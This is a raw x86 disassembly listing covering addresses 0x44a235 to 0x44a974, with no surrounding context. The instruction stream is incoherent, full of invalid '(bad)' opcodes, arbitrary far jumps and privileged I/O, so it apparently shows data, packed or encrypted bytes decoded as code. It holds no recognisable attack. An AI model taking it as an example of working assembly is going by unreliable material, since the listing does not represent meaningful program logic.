  44a235:	adc    eax,0xca4fd1e
  44a23a:	gs jp  0x44a21e
  44a23d:	out    dx,eax
  44a23e:	pop    ds
  44a23f:	jns    0x44a2a6
  44a241:	popf   
  44a242:	dec    ecx
  44a243:	sub    al,0xc
  44a245:	leave  
  44a246:	xor    eax,0xaee078d7
  44a24b:	popa   
  44a24c:	rcl    ah,1
  44a24e:	pop    ds
  44a24f:	or     BYTE PTR [edx-0x6aba03a3],0xb9
  44a256:	adc    al,0xad
  44a258:	push   eax
  44a259:	lea    edi,[edi]
  44a25b:	aam    0x54
  44a25d:	sti    
  44a25e:	mov    esi,0x7c6e51d0
  44a263:	ja     0x44a1ed
  44a265:	jns    0x44a252
  44a267:	ja     0x44a233
  44a269:	add    DWORD PTR [ebx+ebp*4],0x6a
  44a26d:	add    esi,eax
  44a26f:	mov    bh,0xbb
  44a271:	mov    al,ds:0xca52fb14
  44a276:	pop    ebp
  44a277:	jge    0x44a206
  44a279:	punpcklbw mm6,mm1
  44a27c:	cmp    eax,0xbbc6637a
  44a281:	add    eax,0x3e36d138
  44a286:	mov    dh,0xd
  44a288:	fs fwait
  44a28a:	pop    ds
  44a28b:	mov    bl,0x2a
  44a28d:	cmp    ebx,DWORD PTR [edx+esi*2]
  44a290:	xor    cl,0x67
  44a293:	aad    0xb
  44a295:	dec    edi
  44a296:	fwait
  44a297:	add    al,0xdf
  44a299:	inc    edi
  44a29a:	ret    
  44a29b:	mov    eax,ds:0xe91b6b88
  44a2a0:	cmp    bh,dl
  44a2a2:	scas   eax,DWORD PTR es:[edi]
  44a2a3:	data16 sbb al,BYTE PTR [edx]
  44a2a6:	fcomp  QWORD PTR [ebp+0x58a25d7f]
  44a2ac:	mov    ah,0x37
  44a2ae:	jp     0x44a23f
  44a2b0:	dec    esp
  44a2b1:	and    al,0xcf
  44a2b3:	adc    al,0x9b
  44a2b5:	mov    eax,0x2b38ce6
  44a2ba:	mov    al,ds:0x7ba38b1e
  44a2bf:	push   eax
  44a2c0:	loop   0x44a243
  44a2c2:	pop    esi
  44a2c3:	int    0x32
  44a2c5:	iret   
  44a2c6:	loope  0x44a2a1
  44a2c8:	test   BYTE PTR [ebp-0x6d],al
  44a2cb:	daa    
  44a2cc:	pop    eax
  44a2cd:	xor    DWORD PTR [ebp-0x2b],0x5e
  44a2d1:	loopne 0x44a2fc
  44a2d3:	das    
  44a2d4:	stos   BYTE PTR es:[edi],al
  44a2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a2d6:	cmp    ah,BYTE PTR [ebx-0x7a]
  44a2d9:	mov    ebp,0xf071894d
  44a2de:	rol    BYTE PTR [ebx],0xc0
  44a2e1:	es (bad) 
  44a2e3:	aad    0xbf
  44a2e5:	repnz inc esp
  44a2e7:	dec    ebp
  44a2e8:	adc    cl,BYTE PTR [edi-0x58716b28]
  44a2ee:	xchg   esi,eax
  44a2ef:	retf   
  44a2f0:	xor    eax,0xa9aabf5d
  44a2f5:	lods   al,BYTE PTR ds:[esi]
  44a2f6:	lods   al,BYTE PTR ds:[esi]
  44a2f7:	pop    esi
  44a2f8:	imul   eax,DWORD PTR [edx],0xb30c5a62
  44a2fe:	mov    ecx,0x60c18d89
  44a303:	pop    es
  44a304:	push   edx
  44a305:	cmc    
  44a306:	push   edi
  44a307:	and    DWORD PTR [esi],edx
  44a309:	fs pop esi
  44a30b:	aam    0x4c
  44a30d:	mov    bh,BYTE PTR [edi]
  44a30f:	pop    eax
  44a310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a311:	push   0xffffffba
  44a313:	call   0xbaa9:0x760f2a9
  44a31a:	int    0x8f
  44a31c:	or     BYTE PTR [esi-0x6e],cl
  44a31f:	loopne 0x44a30a
  44a321:	add    eax,0x7ec70328
  44a326:	adc    al,0x12
  44a328:	sbb    ecx,DWORD PTR [ebp+ebp*2-0x3]
  44a32c:	mov    ds:0x41d67d09,al
  44a331:	and    DWORD PTR [edx+0x18],0x56
  44a335:	push   ebx
  44a336:	pop    es
  44a337:	xchg   ebx,eax
  44a338:	mov    WORD PTR [edx],es
  44a33a:	jl     0x44a315
  44a33c:	pop    ecx
  44a33d:	cmp    eax,0x20a9124f
  44a342:	ins    DWORD PTR es:[edi],dx
  44a343:	(bad)  
  44a344:	lock jae 0x44a2d4
  44a347:	aaa    
  44a348:	call   0x9c778782
  44a34d:	add    dh,BYTE PTR [eax+0x2]
  44a350:	sar    DWORD PTR [eax+0x6b],0x40
  44a354:	(bad)  
  44a356:	pusha  
  44a357:	push   ecx
  44a358:	mov    ebx,0xd0b02f4b
  44a35d:	pop    ecx
  44a35e:	ret    0xabd4
  44a361:	cld    
  44a362:	retf   0xa53c
  44a365:	into   
  44a366:	push   0x6d
  44a368:	mov    DWORD PTR [ebp+0x47729502],eax
  44a36e:	mov    eax,0x8802ce74
  44a373:	or     BYTE PTR [ebx],dh
  44a375:	lea    ebx,[eax]
  44a377:	mov    ebx,0xb56575ad
  44a37c:	test   BYTE PTR [edx+ecx*4-0x74eff68f],dh
  44a383:	(bad)  
  44a384:	push   0x27d7d1b7
  44a389:	xchg   edx,eax
  44a38a:	lds    ebp,FWORD PTR [edx]
  44a38c:	nop
  44a38d:	shr    BYTE PTR [ebp+0x50854b35],cl
  44a393:	add    eax,0xe2b8b5ca
  44a398:	ins    BYTE PTR es:[edi],dx
  44a399:	push   ss
  44a39a:	sub    ah,al
  44a39c:	xchg   edi,eax
  44a39d:	das    
  44a39e:	adc    BYTE PTR [eax-0x2b1bc40b],cl
  44a3a4:	inc    eax
  44a3a5:	and    al,BYTE PTR [ecx]
  44a3a7:	stc    
  44a3a8:	and    ah,bh
  44a3aa:	aam    0xd4
  44a3ac:	out    dx,eax
  44a3ad:	out    0x5f,al
  44a3af:	int    0xea
  44a3b1:	adc    al,0xcd
  44a3b3:	pop    es
  44a3b4:	mov    DWORD PTR [ebp+0x69e29ced],ebx
  44a3ba:	mov    edx,0x4c029f10
  44a3bf:	cdq    
  44a3c0:	ja     0x44a366
  44a3c2:	xchg   ebp,eax
  44a3c3:	mov    bh,0x75
  44a3c5:	adc    al,0x11
  44a3c7:	fimul  WORD PTR [ecx+0x607a7fb5]
  44a3cd:	mov    eax,0x27aee0c
  44a3d2:	fdiv   st,st(2)
  44a3d4:	mov    ds:0x96e1501e,al
  44a3d9:	inc    eax
  44a3da:	push   ds
  44a3db:	xchg   ecx,eax
  44a3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a3dd:	mov    ecx,0xff4a3234
  44a3e2:	pop    ebx
  44a3e3:	(bad)  
  44a3e4:	lods   al,BYTE PTR ds:[esi]
  44a3e5:	xchg   esp,eax
  44a3e6:	dec    eax
  44a3e7:	adc    bl,dh
  44a3e9:	leave  
  44a3ea:	(bad)  
  44a3eb:	hlt    
  44a3ec:	dec    ecx
  44a3ed:	adc    WORD PTR fs:[edi+0x45d5642a],sp
  44a3f5:	mov    ds:0x8cace2ce,al
  44a3fa:	fwait
  44a3fb:	test   BYTE PTR [eax+0x29cde53d],0xea
  44a402:	jae    0x44a44c
  44a404:	mov    BYTE PTR [edi-0x73a8c087],dl
  44a40a:	add    esp,eax
  44a40c:	dec    ebx
  44a40d:	add    eax,DWORD PTR [ecx+eax*2]
  44a410:	adc    al,BYTE PTR [edx+edx*4+0x57]
  44a414:	addr16 xchg esi,eax
  44a416:	pop    ds
  44a417:	cmp    esp,DWORD PTR [ecx]
  44a419:	sub    bl,BYTE PTR [eax]
  44a41b:	xchg   esi,eax
  44a41c:	add    BYTE PTR [esi+0x7027d404],ah
  44a422:	mov    ebp,0xf857ea16
  44a427:	jmp    0x7be8:0xb9842b85
  44a42e:	ror    ebp,cl
  44a430:	inc    esp
  44a431:	sbb    al,0x56
  44a433:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a435:	jge    0x44a3dc
  44a437:	stc    
  44a438:	leave  
  44a439:	mov    BYTE PTR [eax],dh
  44a43b:	jnp    0x44a3c6
  44a43d:	out    0x51,eax
  44a43f:	mov    ch,0xe1
  44a441:	adc    eax,0xf12c4ae2
  44a446:	xor    edx,edi
  44a448:	mov    eax,ds:0xdbbeff71
  44a44d:	dec    ebp
  44a44e:	xor    DWORD PTR [edi-0x77],0xffffffb5
  44a452:	xchg   BYTE PTR [ebp+ecx*2-0x29],bl
  44a456:	(bad)  
  44a457:	push   esp
  44a458:	push   0x2
  44a45a:	mov    BYTE PTR [edx],bl
  44a45c:	repnz add BYTE PTR [ecx+eax*8-0x349145e1],ch
  44a464:	lods   al,BYTE PTR ds:[esi]
  44a465:	nop
  44a466:	lods   al,BYTE PTR ds:[esi]
  44a467:	mov    eax,DWORD PTR [edi-0x58]
  44a46a:	jg     0x44a4c2
  44a46c:	mov    esp,0x38d242c4
  44a471:	push   ss
  44a472:	dec    esi
  44a473:	jge    0x44a469
  44a475:	push   eax
  44a476:	out    dx,eax
  44a477:	sbb    al,0x9
  44a479:	mov    ch,0x78
  44a47b:	fldcw  WORD PTR [ebp+0xad5546c]
  44a481:	add    edx,DWORD PTR [esp+ebx*8]
  44a484:	xor    eax,0xc2863dbc
  44a489:	sbb    ebx,DWORD PTR [edi]
  44a48b:	inc    edi
  44a48c:	or     eax,0xae53c804
  44a491:	retf   
  44a492:	cwde   
  44a493:	aam    0x7a
  44a495:	push   edi
  44a496:	cmovge edx,DWORD PTR [edi-0x70]
  44a49a:	xchg   ebp,eax
  44a49b:	push   edi
  44a49c:	mov    DWORD PTR [ecx],edi
  44a49e:	mov    esi,0x15abc594
  44a4a3:	pop    edx
  44a4a4:	push   edx
  44a4a5:	sbb    dh,BYTE PTR [edx]
  44a4a7:	inc    ebx
  44a4a8:	and    dl,cl
  44a4aa:	ins    BYTE PTR es:[edi],dx
  44a4ab:	push   esp
  44a4ac:	repz mov eax,0xdb88289e
  44a4b2:	add    DWORD PTR es:[ebx-0x5cbd2563],ebp
  44a4b9:	add    al,dl
  44a4bb:	fcmovnb st,st(3)
  44a4bd:	mov    DWORD PTR [ebp-0x1b],ebp
  44a4c0:	sub    DWORD PTR cs:[ebx-0x45],ecx
  44a4c4:	loope  0x44a4d6
  44a4c6:	push   ds
  44a4c7:	push   ecx
  44a4c8:	shr    DWORD PTR [esi-0x3a],1
  44a4cb:	jbe    0x44a4d7
  44a4cd:	add    edx,DWORD PTR [edx+0x135de572]
  44a4d3:	test   DWORD PTR [eax-0x26],ebx
  44a4d6:	pusha  
  44a4d7:	sub    esp,edi
  44a4d9:	sub    ebp,edi
  44a4db:	(bad)  
  44a4dc:	push   esp
  44a4dd:	cmc    
  44a4de:	pop    ebp
  44a4df:	aam    0x56
  44a4e1:	aam    0x43
  44a4e3:	js     0x44a52a
  44a4e5:	pop    esi
  44a4e6:	fwait
  44a4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a4e8:	mov    DWORD PTR [edi+0x45],esi
  44a4eb:	int3   
  44a4ec:	outs   dx,DWORD PTR ds:[esi]
  44a4ed:	mov    esp,0x4ac9d6c2
  44a4f2:	cli    
  44a4f3:	cmp    bl,BYTE PTR ds:0x3184d002
  44a4f9:	dec    edx
  44a4fa:	out    dx,eax
  44a4fb:	add    al,0x70
  44a4fd:	int3   
  44a4fe:	adc    al,0xa1
  44a500:	sub    DWORD PTR [edx],ecx
  44a502:	lds    eax,FWORD PTR [edx]
  44a504:	mov    DWORD PTR [ebp+0x4efe118d],ecx
  44a50a:	arpl   WORD PTR [edi+0x7d],dx
  44a50d:	sbb    al,0x9c
  44a50f:	jae    0x44a4bf
  44a511:	shl    BYTE PTR [edi],1
  44a513:	loope  0x44a4fd
  44a515:	mov    dh,0x9e
  44a517:	inc    esp
  44a518:	jns    0x44a511
  44a51a:	mov    al,0x11
  44a51c:	jae    0x44a53b
  44a51e:	jg     0x44a4c4
  44a520:	mov    DWORD PTR [ecx],esp
  44a522:	or     eax,0x87528b4b
  44a527:	fld    TBYTE PTR [ebp+0x66]
  44a52a:	or     BYTE PTR [ecx],dl
  44a52c:	rol    BYTE PTR ds:0x20ec79d0,0xb
  44a533:	xchg   ecx,eax
  44a534:	mov    DWORD PTR [ecx],esp
  44a536:	cs mov esi,fs
  44a539:	mov    ah,cl
  44a53b:	scas   eax,DWORD PTR es:[edi]
  44a53c:	push   0x5a8bea03
  44a541:	dec    eax
  44a542:	xchg   ebx,eax
  44a543:	arpl   WORD PTR [ebx],di
  44a545:	push   es
  44a546:	pop    ds
  44a547:	jne    0x44a532
  44a549:	inc    esp
  44a54a:	push   esp
  44a54b:	js     0x44a53c
  44a54d:	jg     0x44a4fe
  44a54f:	pop    eax
  44a550:	dec    edi
  44a551:	pop    ds
  44a552:	dec    edx
  44a553:	stos   BYTE PTR es:[edi],al
  44a554:	out    0x5,eax
  44a556:	jl     0x44a546
  44a558:	cld    
  44a559:	mov    edi,0x6d88776c
  44a55e:	pop    ebp
  44a55f:	test   DWORD PTR [ebp+0x27954a2b],edx
  44a565:	add    esi,DWORD PTR [ebx+eiz*1-0x74e45635]
  44a56c:	(bad)  
  44a56d:	mov    ch,0x7b
  44a56f:	in     eax,0xc7
  44a571:	pushf  
  44a572:	rcl    edx,1
  44a574:	xor    ch,BYTE PTR [ecx-0x1071eab8]
  44a57a:	int3   
  44a57b:	mov    edx,0xc70c0420
  44a580:	jne    0x44a585
  44a582:	dec    esp
  44a583:	pop    edx
  44a584:	mov    edx,0x302e9182
  44a589:	adc    ch,BYTE PTR [eax-0x27f24f2b]
  44a58f:	fs inc ecx
  44a591:	xchg   BYTE PTR [esp+edi*2],dl
  44a594:	call   0x4483:0x359b3103
  44a59b:	and    eax,0x20dac3a1
  44a5a0:	mov    DWORD PTR [ecx-0x44795b1f],ecx
  44a5a6:	mov    edx,0x3e4bf775
  44a5ab:	mov    ch,0xa2
  44a5ad:	test   DWORD PTR [edi+edx*1],ecx
  44a5b0:	jp     0x44a539
  44a5b2:	xor    BYTE PTR [esi-0x71],cl
  44a5b5:	xchg   ebx,eax
  44a5b6:	cs push edi
  44a5b8:	bound  ecx,QWORD PTR [edx-0x46]
  44a5bb:	je     0x44a593
  44a5bd:	cmp    BYTE PTR [eax],bl
  44a5bf:	aam    0xdb
  44a5c1:	call   0x90209e73
  44a5c6:	jne    0x44a5d1
  44a5c8:	mov    DWORD PTR [ecx],ecx
  44a5ca:	fisub  WORD PTR [ecx-0x7b]
  44a5cd:	add    DWORD PTR [edx-0x69fa17f1],esp
  44a5d3:	lds    edx,FWORD PTR [esi]
  44a5d5:	neg    DWORD PTR [edx]
  44a5d7:	add    al,0x9c
  44a5d9:	clc    
  44a5da:	outs   dx,BYTE PTR ds:[esi]
  44a5db:	fwait
  44a5dc:	(bad)  
  44a5dd:	repz mov al,gs:0xc3335cf5
  44a5e4:	add    DWORD PTR [ebx+0x1d],edx
  44a5e7:	stos   DWORD PTR es:[edi],eax
  44a5e8:	push   ebx
  44a5e9:	add    al,BYTE PTR [eax-0x3d4b1bed]
  44a5ef:	js     0x44a5c5
  44a5f1:	mov    edi,0x3f899d23
  44a5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a5f7:	xor    DWORD PTR [edi-0x4d],0x58f5283
  44a5fe:	ss sahf 
  44a600:	xor    BYTE PTR ds:[edi+0x6f],ah
  44a604:	sbb    al,0x46
  44a606:	pop    ds
  44a607:	sbb    DWORD PTR [edi],esp
  44a609:	loop   0x44a5a8
  44a60b:	pop    edi
  44a60c:	adc    BYTE PTR [ebp-0x31592b92],ah
  44a612:	adc    BYTE PTR [ebx+0x4],ah
  44a615:	bound  esi,QWORD PTR [esi]
  44a617:	sbb    DWORD PTR [edi-0x77ce9897],esp
  44a61d:	mov    bl,0x35
  44a61f:	mov    eax,ds:0xd5aa266e
  44a624:	clc    
  44a625:	pop    eax
  44a626:	mov    dl,0xeb
  44a628:	fs inc edi
  44a62a:	cmp    DWORD PTR [eax+0x491f7466],edx
  44a630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a631:	xor    BYTE PTR [edx+0x48382ef5],dl
  44a637:	aam    0x47
  44a639:	adc    al,dh
  44a63b:	jne    0x44a5f6
  44a63d:	pop    ds
  44a63e:	cmc    
  44a63f:	mov    dh,0x70
  44a641:	sub    bh,BYTE PTR [edx-0x4d]
  44a644:	xchg   DWORD PTR [eax+0x7e1155b],edi
  44a64a:	cs clc 
  44a64c:	jo     0x44a624
  44a64e:	retf   0x69d4
  44a651:	jae    0x44a6ba
  44a653:	xchg   esi,eax
  44a654:	mov    DWORD PTR [esi+edi*8+0x15ad9704],ebp
  44a65b:	mov    dl,0xd7
  44a65d:	lahf   
  44a65e:	adc    bh,BYTE PTR fs:[esi]
  44a661:	xor    al,BYTE PTR [ebx]
  44a663:	test   BYTE PTR [ebx],dh
  44a665:	add    ecx,DWORD PTR [ecx+eiz*2+0x1]
  44a669:	fld    QWORD PTR [eax+0x66]
  44a66c:	ret    
  44a66d:	shl    DWORD PTR [ebx+eax*4-0x57],1
  44a671:	xchg   ecx,eax
  44a672:	add    al,0xb1
  44a674:	mov    dl,BYTE PTR [ebp+0x5]
  44a677:	jmp    FWORD PTR [ecx]
  44a679:	pop    esi
  44a67a:	iret   
  44a67b:	in     al,dx
  44a67c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a67d:	inc    esi
  44a67e:	ins    BYTE PTR es:[edi],dx
  44a67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a680:	cmp    eax,DWORD PTR [edx]
  44a682:	mov    DWORD PTR [edi],ebx
  44a684:	data16 jnp 0x44a62e
  44a687:	dec    edx
  44a688:	pop    esp
  44a689:	stc    
  44a68a:	sahf   
  44a68b:	lods   eax,DWORD PTR ds:[esi]
  44a68c:	out    dx,eax
  44a68d:	sbb    al,0x18
  44a68f:	popf   
  44a690:	ds pop ds
  44a692:	push   0x5a644404
  44a697:	aad    0xea
  44a699:	aam    0xd6
  44a69b:	stc    
  44a69c:	shl    BYTE PTR [ecx+0xa],0x7a
  44a6a0:	mov    BYTE PTR [ecx],ch
  44a6a2:	out    dx,al
  44a6a3:	mov    ebx,0x8541ebb
  44a6a8:	inc    DWORD PTR [edx]
  44a6aa:	and    al,0x76
  44a6ac:	test   eax,0xae4cdea9
  44a6b1:	dec    edi
  44a6b2:	push   ds
  44a6b3:	push   ebp
  44a6b4:	leave  
  44a6b5:	xor    BYTE PTR [eax-0x9ba91fc],dl
  44a6bb:	mov    ecx,0x4e435fb2
  44a6c0:	dec    ecx
  44a6c1:	push   0x13
  44a6c3:	retf   0x9c0
  44a6c6:	arpl   WORD PTR [ecx+0x401c1fc9],bp
  44a6cc:	add    al,BYTE PTR [edx+0x5b54dcdc]
  44a6d2:	stos   BYTE PTR es:[edi],al
  44a6d3:	lahf   
  44a6d4:	sbb    DWORD PTR [ebx],eax
  44a6d6:	dec    edx
  44a6d7:	ins    BYTE PTR es:[edi],dx
  44a6d8:	ret    0xf15f
  44a6db:	inc    eax
  44a6dc:	mov    DWORD PTR [edi],edx
  44a6de:	sub    al,0x67
  44a6e0:	cmp    edi,DWORD PTR [ebp+edi*2-0x2d]
  44a6e4:	pop    DWORD PTR ds:0x6765722e
  44a6ea:	jnp    0x44a6b7
  44a6ec:	cmc    
  44a6ed:	(bad)  
  44a6ee:	sub    ax,0x9083
  44a6f2:	xor    BYTE PTR [edi+0x3116b590],ch
  44a6f8:	ret    
  44a6f9:	add    edx,DWORD PTR [eax+0x51]
  44a6fc:	clc    
  44a6fd:	enter  0x6d87,0x29
  44a701:	mov    ds:0xf5883438,eax
  44a706:	fsub   QWORD PTR [eax-0x6515b9ab]
  44a70c:	test   DWORD PTR [edi],esp
  44a70e:	adc    BYTE PTR [ecx+0x24],ah
  44a711:	mov    esp,0xc847d022
  44a716:	mov    DWORD PTR [ebp-0x4c],edx
  44a719:	loopne 0x44a6e9
  44a71b:	mov    DWORD PTR fs:[ebx-0x6f89c7d9],ebx
  44a722:	cmc    
  44a723:	pushf  
  44a724:	pop    eax
  44a725:	add    esi,esi
  44a727:	fwait
  44a728:	ret    
  44a729:	and    BYTE PTR [edx+ecx*8+0x1a7ce5a4],cl
  44a730:	mov    BYTE PTR ds:0x65f80015,ch
  44a736:	popa   
  44a737:	jmp    0x44a6ef
  44a739:	add    bl,BYTE PTR [esi*2+0x7704708d]
  44a740:	cmp    al,0x5e
  44a742:	pop    ds
  44a743:	dec    ebx
  44a744:	push   0x9d0f2398
  44a749:	or     eax,DWORD PTR [edx+eax*2-0x49]
  44a74d:	sbb    DWORD PTR [edi],0x9b9d29c0
  44a753:	ret    
  44a754:	(bad)  
  44a755:	rcr    DWORD PTR [edi],cl
  44a757:	xchg   ebp,eax
  44a758:	push   esi
  44a759:	xor    edi,DWORD PTR [edx-0x62]
  44a75c:	mov    al,ds:0x3bd59947
  44a761:	dec    eax
  44a762:	nop    DWORD PTR [edx-0x76c214ca]
  44a769:	or     edx,esi
  44a76b:	cmp    ebx,DWORD PTR [edx-0x5aa078c1]
  44a771:	add    eax,0x1568b51a
  44a776:	cmp    al,0x5f
  44a778:	adc    eax,0x2ca9b788
  44a77d:	xor    ebp,DWORD PTR [ebp+0x2d]
  44a780:	ret    0xa0e0
  44a783:	inc    eax
  44a784:	pop    ss
  44a785:	sub    ah,ah
  44a787:	inc    edi
  44a788:	retf   
  44a789:	shl    BYTE PTR [ebp-0x7f],0x6e
  44a78d:	push   0x12
  44a78f:	mov    dl,0xf9
  44a791:	es jno 0x44a7e0
  44a794:	les    eax,FWORD PTR [ecx+0x34]
  44a797:	stos   BYTE PTR es:[edi],al
  44a798:	mov    DWORD PTR [ebp-0x19],edx
  44a79b:	pop    esp
  44a79c:	in     al,dx
  44a79d:	inc    esi
  44a79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a79f:	aam    0x43
  44a7a1:	imul   eax,DWORD PTR [esi],0x37e08341
  44a7a7:	mov    ecx,0x911f3d54
  44a7ac:	(bad)  
  44a7ad:	stos   DWORD PTR es:[edi],eax
  44a7ae:	or     al,0xb9
  44a7b0:	clc    
  44a7b1:	dec    ebp
  44a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a7b3:	mov    ds:0x37690b72,eax
  44a7b8:	xchg   DWORD PTR [edx+0x4a],edi
  44a7bb:	adc    al,0xb0
  44a7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a7be:	enter  0x88e9,0x73
  44a7c2:	mov    DWORD PTR [ecx],ebp
  44a7c4:	imul   esi,DWORD PTR [esi+0x4e],0x74
  44a7c8:	inc    edi
  44a7c9:	aad    0xc1
  44a7cb:	aam    0x36
  44a7cd:	lods   eax,DWORD PTR ds:[esi]
  44a7ce:	pop    ds
  44a7cf:	les    esi,FWORD PTR es:[esi]
  44a7d2:	hlt    
  44a7d3:	inc    esp
  44a7d4:	mov    BYTE PTR [edi-0x2d86adc7],bl
  44a7da:	out    dx,eax
  44a7db:	repz scas eax,DWORD PTR es:[edi]
  44a7dd:	jae    0x44a787
  44a7df:	hlt    
  44a7e0:	(bad)  
  44a7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a7e2:	iret   
  44a7e3:	or     ebx,DWORD PTR [edx+0x74aa9f62]
  44a7e9:	sub    eax,0x54ecf16c
  44a7ee:	lods   eax,DWORD PTR ds:[esi]
  44a7ef:	xchg   DWORD PTR [ecx-0x66],ecx
  44a7f2:	add    BYTE PTR [edi],dh
  44a7f4:	xchg   DWORD PTR [edx],eax
  44a7f6:	shl    bl,cl
  44a7f8:	sbb    bl,BYTE PTR [ecx+edi*4]
  44a7fb:	and    eax,0x2f1e5be2
  44a800:	in     al,0x31
  44a802:	mov    al,ds:0x89eb525d
  44a807:	clc    
  44a808:	and    BYTE PTR [eax+esi*4],0x1d
  44a80c:	adc    dl,bl
  44a80e:	sbb    DWORD PTR [ebp-0x4789846],esp
  44a814:	dec    eax
  44a815:	sub    al,0xfe
  44a817:	push   ebp
  44a818:	and    BYTE PTR ds:[esi],bl
  44a81b:	test   DWORD PTR [edx+0x40],ebx
  44a81e:	inc    esp
  44a81f:	inc    eax
  44a820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a821:	push   0xffffffe4
  44a823:	repz sbb BYTE PTR [ebx],al
  44a826:	mov    edx,0xdebdac2d
  44a82b:	and    edi,ebx
  44a82d:	(bad)  
  44a82e:	pop    edx
  44a82f:	sub    eax,0x581e587e
  44a834:	ror    BYTE PTR [ecx+0x1578732d],0x2a
  44a83b:	repnz xchg ecx,eax
  44a83d:	hlt    
  44a83e:	outs   dx,BYTE PTR ds:[esi]
  44a83f:	je     0x44a8bb
  44a841:	push   esp
  44a842:	shl    DWORD PTR [esi+0x69539b89],0x15
  44a849:	mov    ah,0x14
  44a84b:	sub    esi,ecx
  44a84d:	jne    0x44a7f8
  44a84f:	pop    esi
  44a850:	pop    eax
  44a851:	out    dx,al
  44a852:	pop    ds
  44a853:	lds    edi,FWORD PTR [edx+0x6b]
  44a856:	les    ebx,FWORD PTR [ebx+eiz*2]
  44a859:	adc    eax,0x479cb71f
  44a85e:	stos   DWORD PTR es:[edi],eax
  44a85f:	cmp    al,BYTE PTR [esi-0x2]
  44a862:	jl     0x44a839
  44a864:	inc    ebx
  44a865:	mov    cl,0x2d
  44a867:	pop    ebp
  44a868:	test   al,0x6a
  44a86a:	pop    es
  44a86b:	pop    esi
  44a86c:	popa   
  44a86d:	stos   DWORD PTR es:[edi],eax
  44a86e:	jl     0x44a7fb
  44a870:	sbb    al,0xce
  44a872:	pop    ebx
  44a873:	adc    al,0xe0
  44a875:	fwait
  44a876:	aaa    
  44a877:	into   
  44a878:	(bad)  
  44a879:	jne    0x44a8ac
  44a87b:	xlat   BYTE PTR ds:[ebx]
  44a87c:	je     0x44a811
  44a87e:	mov    bh,0x70
  44a880:	inc    esp
  44a881:	and    al,0xda
  44a883:	outs   dx,DWORD PTR ds:[esi]
  44a884:	mov    BYTE PTR [ebx+0x32],cl
  44a887:	daa    
  44a888:	cmp    bh,BYTE PTR [edx+0x59b6244]
  44a88e:	fdivr  st(5),st
  44a890:	sbb    DWORD PTR [esi-0x1a964ee4],esi
  44a896:	pop    ds
  44a897:	mov    ecx,0xc9ac1dc4
  44a89c:	scas   al,BYTE PTR es:[edi]
  44a89d:	loope  0x44a83b
  44a89f:	aad    0x3b
  44a8a1:	mov    BYTE PTR [edx-0x11700807],ah
  44a8a7:	jl     0x44a831
  44a8a9:	and    DWORD PTR [eax],ebp
  44a8ab:	push   edi
  44a8ac:	mov    edx,0xed47f4ff
  44a8b1:	add    BYTE PTR [edx],dl
  44a8b3:	jmp    0x44a92e
  44a8b5:	mov    cl,cl
  44a8b7:	adc    al,0xb2
  44a8b9:	iret   
  44a8ba:	push   eax
  44a8bb:	ss dec edx
  44a8bd:	clc    
  44a8be:	jge    0x44a913
  44a8c0:	sbb    esi,DWORD PTR [ebx+0x1cee2768]
  44a8c6:	sub    bl,BYTE PTR [ebx]
  44a8c8:	adc    eax,DWORD PTR [eax+eax*8+0x40ff0c0f]
  44a8cf:	aad    0x12
  44a8d1:	dec    edi
  44a8d2:	mov    WORD PTR ss:[ebp-0x7671191a],ss
  44a8d9:	sar    DWORD PTR [ebx+0x7cf6a190],cl
  44a8df:	test   eax,0xb22e3f5e
  44a8e4:	jg     0x44a8e9
  44a8e6:	sbb    dl,BYTE PTR [esi+ebp*2+0x61b65c33]
  44a8ed:	int3   
  44a8ee:	pop    ds
  44a8ef:	mov    ch,0x12
  44a8f1:	xlat   BYTE PTR ds:[ebx]
  44a8f2:	pop    ecx
  44a8f3:	jmp    0x26a3:0xbba41754
  44a8fa:	ret    
  44a8fb:	js     0x44a905
  44a8fd:	int    0x16
  44a8ff:	inc    esi
  44a900:	mov    dh,BYTE PTR [ebx+0x4189ae09]
  44a906:	or     eax,0xc69a47c4
  44a90b:	pop    ebp
  44a90c:	in     eax,dx
  44a90d:	add    eax,0x671eb754
  44a912:	in     al,0x5b
  44a914:	mov    cl,0xef
  44a916:	pusha  
  44a917:	shl    ebx,cl
  44a919:	push   cs
  44a91a:	and    BYTE PTR [edi-0x3a],ch
  44a91d:	pop    esi
  44a91e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a91f:	aad    0xeb
  44a921:	adc    esi,DWORD PTR [eax+eiz*1+0x71]
  44a925:	les    edi,FWORD PTR [ebp+0x1f834122]
  44a92b:	imul   edx,ebx,0x585f2418
  44a931:	jb     0x44a903
  44a933:	aam    0x29
  44a935:	(bad)  
  44a936:	fwait
  44a937:	mov    dh,0x5a
  44a939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a93a:	loop   0x44a8da
  44a93c:	mov    edx,DWORD PTR [ecx]
  44a93e:	dec    ecx
  44a93f:	dec    edi
  44a940:	jge    0x44a8c4
  44a942:	or     DWORD PTR [ebx+0x6d7ab12],eax
  44a948:	jle    0x44a94a
  44a94a:	fisub  DWORD PTR [edx+0x8bf9686]
  44a950:	pushf  
  44a951:	jmp    0xfb0c:0x3884888
  44a958:	hlt    
  44a959:	bound  ebx,QWORD PTR [edx]
  44a95b:	xor    dl,bl
  44a95d:	dec    ecx
  44a95e:	mov    ebx,es
  44a960:	mov    cl,0xa9
  44a962:	or     ebp,DWORD PTR [eax]
  44a964:	xchg   BYTE PTR [ecx],ah
  44a966:	jl     0x44a8fc
  44a968:	pop    esi
  44a969:	cld    
  44a96a:	cwde   
  44a96b:	shl    BYTE PTR [eax-0x77614257],cl
  44a971:	xchg   esp,eax
  44a972:	pop    edi
  44a973:	push   esi
  44a974:	cmp    ah,ah
